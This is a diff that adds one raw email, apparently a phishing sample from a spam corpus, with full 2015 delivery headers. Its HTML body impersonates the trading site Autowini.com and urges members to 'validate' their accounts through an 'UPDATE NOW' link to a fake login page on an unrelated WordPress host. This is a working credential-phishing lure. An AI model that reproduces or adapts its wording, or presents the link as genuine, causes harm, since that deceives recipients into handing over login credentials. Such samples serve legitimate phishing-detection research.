@@ -1,0 +1,79 @@
+Return-Path: <acteamco@server2.aking.com.my>
+X-Original-To: jose@login.monkey.org
+Delivered-To: jose@login.monkey.org
+Received: from forward.b.hostedemail.com (forward.b.hostedemail.com [64.98.36.17])
+	by l.monkey.org (Postfix) with ESMTP id 670D3F408C
+	for <jose@login.monkey.org>; Sat, 24 Jan 2015 03:51:47 -0600 (CST)
+Received: from smtpin12.hostedemail.com (10.5.19.248.rfc1918.com [10.5.19.248])
+	by ofarelay03.b.hostedemail.com (Postfix) with SMTP id 1E36618427C
+	for <jose@login.monkey.org>; Sat, 24 Jan 2015 09:51:47 +0000 (UTC)
+X-Forwarded-For: jose@monkey.org by Hostedemail
+Delivered-To: jose@monkey.org
+X-FDA: 69785872254.12.play81_f5a8a00e9c13
+Authentication-Results: auth.b.hostedemail.com; dmarc=none header.from=autowini.com
+Authentication-Results: auth.b.hostedemail.com; dkim=none
+	reason="no signature"; dkim-adsp=none (insecure policy);
+	dkim-atps=neutral
+X-Spam-Summary: 80,6,0,7996bb0ce6703ca3,d41d8cd98f00b204,acteamco@server2.aking.com.my,:,RULES_HIT:41:46:72:150:153:355:375:379:543:967:969:973:983:988:989:1208:1216:1224:1260:1311:1313:1314:1345:1381:1431:1432:1437:1513:1515:1516:1517:1521:1534:1540:1568:1570:1593:1594:1676:1699:1711:1714:1730:1747:1777:1792:2198:2199:2393:2525:2549:2561:2564:2610:2682:2685:2731:2859:2890:2895:2905:2933:2937:2939:2942:2945:2947:2951:2954:3022:3138:3139:3140:3141:3142:3867:3868:3870:3871:3872:3873:3874:3934:3936:3938:3941:3944:3947:3950:3953:3956:3959:4039:4042:4250:5007:6261:6300:6678:7875:8518:8597:8599:8603:9025:9040:9072:9343:9388:9908:10004:10049:10346:10400:11658:11914:11984:12043:12075:12114:12248:12660:12663:12749:12776:12956:12958:13005:13017:13018:13019:13311:13357:14096:21080,0,RBL:neutral,CacheIP:none,Bayesian:0.5,0.5,0.5,Netcheck:none,DomainCache:0,MSF:not bulk,SPF:fn,MSBL:0,DNSBL:neutral,Custom_rules:0:0:0
+X-HE-Tag: play81_f5a8a00e9c13
+X-Filterd-Recvd-Size: 2201
+Received: from server2.aking.com.my (server2.aking.com.my [103.18.247.72])
+	by imf19.b.hostedemail.com (Postfix) with ESMTP
+	for <jose@monkey.org>; Sat, 24 Jan 2015 09:51:45 +0000 (UTC)
+Received: from acteamco by server2.aking.com.my with local (Exim 4.84)
+	(envelope-from <acteamco@server2.aking.com.my>)
+	id 1YExNW-0006O9-Bw
+	for jose@monkey.org; Sat, 24 Jan 2015 17:51:42 +0800
+Date: Sat, 24 Jan 2015 17:51:42 +0800
+To: jose@monkey.org
+From: =?UTF-8?Q?Autowini=2ecom?= <davidc@autowini.com>
+Subject: =?UTF-8?Q?Important_Notice_On_Your_Account?=
+Message-ID: <06c8fdbe8d7aaf5ff35fe26e03b4e54e@welcome.acteam.com.my>
+X-Priority: 3
+MIME-Version: 1.0
+Content-Transfer-Encoding: quoted-printable
+Content-Type: text/html; charset="us-ascii"
+X-AntiAbuse: This header was added to track abuse, please include it with any abuse report
+X-AntiAbuse: Primary Hostname - server2.aking.com.my
+X-AntiAbuse: Original Domain - monkey.org
+X-AntiAbuse: Originator/Caller UID/GID - [530 531] / [47 12]
+X-AntiAbuse: Sender Address Domain - server2.aking.com.my
+X-Get-Message-Sender-Via: server2.aking.com.my: authenticated_id: acteamco/only user confirmed/virtual account not confirmed
+Status: RO
+X-Status: 
+X-Keywords:                 
+X-UID: 13
+
+<img alt=3D"" src=3D"http://image.autowini.com/IMG/COMMON/new_logo.gif">
+<p>
+<font style=3D"font-size:8pt" face=3D"Verdana"><font color=3D"#0000ff"><b>D=
+ear Our Valued Members </b> <br> <br>
+
+
+Autowini IT department have upgraded our marketing system to a very wide ne=
+twork now<br> that you can have any supplier or buyer at easy reach.<br> So=
+ Account Validation is very important to AUTOWINI in order to keep your acc=
+ount active,<br>receive latest email notification and also meeting with Ver=
+ified General Goods Importers & Associates;
+
+
+<br>
+
+</font> <b><font color=3D"red"><a href=3D"http://www.ascensionplus.com/wp-c=
+ontent/languages/themes/mode/a/Autowini.login.do.htm" target=3D"_blank">
+
+
+
+<br> <font color=3D"red">UPDATE NOW</font></a> </font> </b><font color=3D"#=
+0000ff"><br> <br>
+
+
+
+
+
+
+&#8251;Thank you very much for your understanding.<br>We wish you abundant =
+success and joy in Autowini.com!<br> - Autowini Team -</font>
+
+
+</font></p></div><br></div>
